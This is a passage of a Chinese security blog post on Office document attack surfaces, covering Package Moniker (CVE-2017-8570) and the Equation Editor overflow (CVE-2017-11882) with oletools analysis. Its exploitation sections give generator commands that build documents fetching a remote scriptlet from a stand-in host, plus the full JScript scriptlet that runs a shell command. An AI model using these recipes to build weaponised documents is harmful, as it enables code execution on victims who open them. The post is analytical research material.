<p>使用ole tools分析漏洞文档，用rtfobj提取bin文件<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15967880432630.jpg" alt="-w644"></p>
<p>可以看到OLE对象的class name为ole2link，以及嵌入的恶意url地址。</p>
<h2 id="Package-Moniker"><a href="#Package-Moniker" class="headerlink" title="Package Moniker"></a>Package Moniker</h2><h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><p>利用Office OLE中的Composite Moniker对象在组合File Moniker对象的过程中，未做安全性检测，将File Moniker对象指定的远程/本地的脚本文件在Office中直接执行。</p>
<h3 id="利用-7"><a href="#利用-7" class="headerlink" title="利用"></a>利用</h3><p>环境：win7+office2010<br>Package Moniker对应的漏洞有CVE-2017-0199、CVE-2017-8570，这里CVE-2017-8570为例。<br>利用工具<a href="https://github.com/tezukanice/Office8570" target="_blank" rel="noopener">Office8570</a>制作生成ppsx文档<br><code>python cve-2017-8570_toolkit.py -M gen -w OfficePackageMonikerExecution.ppsx -u http://example.com/logo.doc</code></p>
<p>logo.doc为如下sct文件，部署到web服务器即可</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?XML version="1.0"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">registration</span></span></span></span><br><span class="line"><span class="xml">    description="Bandit"</span></span><br><span class="line"><span class="xml">    progid="Bandit"</span></span><br><span class="line"><span class="xml">    version="1.00"</span></span><br><span class="line"><span class="xml">    classid="</span><span class="template-variable">&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;</span><span class="xml">"</span></span><br><span class="line"><span class="xml">    remotable="true"</span></span><br><span class="line"><span class="xml">	&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"JScript"</span>&gt;</span></span></span><br><span class="line"><span class="xml">&lt;![CDATA[</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");</span></span><br><span class="line"><span class="xml">	</span></span><br><span class="line"><span class="xml">	</span></span><br><span class="line"><span class="xml">]]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>打开ppt文档，便会加载执行sct脚本<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/OfficePackageMonikerExecution.gif" alt=""></p>
<p>查看ppt文档的解压缩文件ppt\slides_rels\slide1.xml.rels，ID为rId3的是一个OLE对象，指向的链接正是上面的脚本地址<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15966215656488.jpg" alt="-w1121"></p>
<h2 id="公式编辑器漏洞"><a href="#公式编辑器漏洞" class="headerlink" title="公式编辑器漏洞"></a>公式编辑器漏洞</h2><h3 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h3><p>以CVE-2017-11882为例，也称为噩梦公式漏洞。该漏洞的成因是EQNEDT32.EXE进程在读入包含MathType的ole数据时，在拷贝公式字体名称时没有对名称长度进行校验，从而造成栈缓冲区溢出，是一个经典的栈溢出漏洞。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15967859488655.jpg" alt="-w518"></p>
<h3 id="利用-8"><a href="#利用-8" class="headerlink" title="利用"></a>利用</h3><p>环境：win7+office2010<br>直接用脚本生成漏洞利用文档<br><code>python Command43b_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o EQNEDT-Execution.doc</code><br>打开文档，命令直接执行，无弹窗。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/EQNEDT-Execution.gif" alt=""></p>
<p>查看进程，可以看到这个漏洞是由EQNEDT32.EXE造成的<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15967845604270.jpg" alt="-w768"></p>
<p>使用ole tools分析漏洞文档，用rtfobj提取bin文件<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15967864812509.jpg" alt="-w661"><br>看到OLE对象的class name为Equation.3，再用olebrowse对它进行分析，该类型OLE对象中内嵌了Equation Native数据流<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15967865638924.jpg" alt="-w546"></p>
<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2020/08/07/15967864359921.jpg" alt="-w645"><br>可以看到这里就是溢出的时候用来覆盖内容。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文介绍了通过利用宏、DDE协议、Power Query、模板注入、ppt动作按钮、内嵌视频、OLE2link等通过自身特性的方式，构造恶意文档实现代码执行的方法，以及利用Package Moniker加载时未做校验的缺陷和公式编辑器的栈溢出漏洞实现的无感攻击方法。总结后发现office文档下的攻击着实很精彩，值得深入研究探索，尤其是自身特性的利用。本文只是抛砖引玉，限于时间和篇幅，没有对免杀和弹窗做处理，还有更多更好的方法还请大家一起来深入讨论。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.sunxiaokong.xyz/2020-01-11/CVE-2017-11882-analysis/" target="_blank" rel="noopener">CVE-2017-11882 漏洞复现</a><br><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/hide-and-script-inserted-malicious-urls-within-office-documents-embedded-videos/" target="_blank" rel="noopener">Hide and Script: Inserted Malicious URLs within Office Documents’ Embedded Videos</a><br><a href="https://www.anquanke.com/post/id/181206" target="_blank" rel="noopener">如何利用Power Query功能实现DDE攻击</a><br><a href="https://www.anquanke.com/post/id/180067" target="_blank" rel="noopener">宏观视角下的office漏洞</a></p>

  </div>
</article>

    <div class="blog-post-comments">
        <div style="text-align:center;">
            <button class="disbtn" id="load-disqus" onclick="disqus.load();">显示评论</button>
        </div>
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#office文档攻击面分析"><span class="toc-number">1.</span> <span class="toc-text">office文档攻击面分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#office文档格式"><span class="toc-number">1.1.</span> <span class="toc-text">office文档格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#宏"><span class="toc-number">1.2.</span> <span class="toc-text">宏</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DDE"><span class="toc-number">1.3.</span> <span class="toc-text">DDE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Power-Query"><span class="toc-number">1.4.</span> <span class="toc-text">Power Query</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-2"><span class="toc-number">1.5.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-2"><span class="toc-number">1.5.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#模板注入"><span class="toc-number">1.6.</span> <span class="toc-text">模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-3"><span class="toc-number">1.6.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-3"><span class="toc-number">1.6.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PPT动作按钮"><span class="toc-number">1.7.</span> <span class="toc-text">PPT动作按钮</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-4"><span class="toc-number">1.7.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-4"><span class="toc-number">1.7.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内嵌视频"><span class="toc-number">1.8.</span> <span class="toc-text">内嵌视频</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-5"><span class="toc-number">1.8.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-5"><span class="toc-number">1.8.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#插入外部对象（OLE2link）"><span class="toc-number">1.9.</span> <span class="toc-text">插入外部对象（OLE2link）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-6"><span class="toc-number">1.9.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-6"><span class="toc-number">1.9.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Package-Moniker"><span class="toc-number">1.10.</span> <span class="toc-text">Package Moniker</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-7"><span class="toc-number">1.10.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-7"><span class="toc-number">1.10.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#公式编辑器漏洞"><span class="toc-number">1.11.</span> <span class="toc-text">公式编辑器漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-8"><span class="toc-number">1.11.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-8"><span class="toc-number">1.11.2.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">1.12.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">1.13.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/web-security/office-document-attack-surface.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&text=office文档攻击面分析" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&title=office文档攻击面分析" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&is_video=false&description=office文档攻击面分析" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=office文档攻击面分析&body=Check out this article: http://zerokeeper.github.io/web-security/office-document-attack-surface.html" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&title=office文档攻击面分析" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&title=office文档攻击面分析" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&title=office文档攻击面分析" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&title=office文档攻击面分析" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/web-security/office-document-attack-surface.html&name=office文档攻击面分析&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2022 zerokeeper
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<!-- clipboard -->

  <script src="/lib/clipboard/clipboard.min.js"></script>
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight .code pre").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      target: function(trigger) {
        return trigger.nextElementSibling;
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>

<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-150447622-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?678fcadf6468f171c83dbf3d406feaaf";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'zerokeeper';
        var disqus = {
        load : function disqus(){
        (function (){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
        $('#load-disqus').remove(); ///加载后移除按钮
        }
        }
    </script>


</body>
</html>
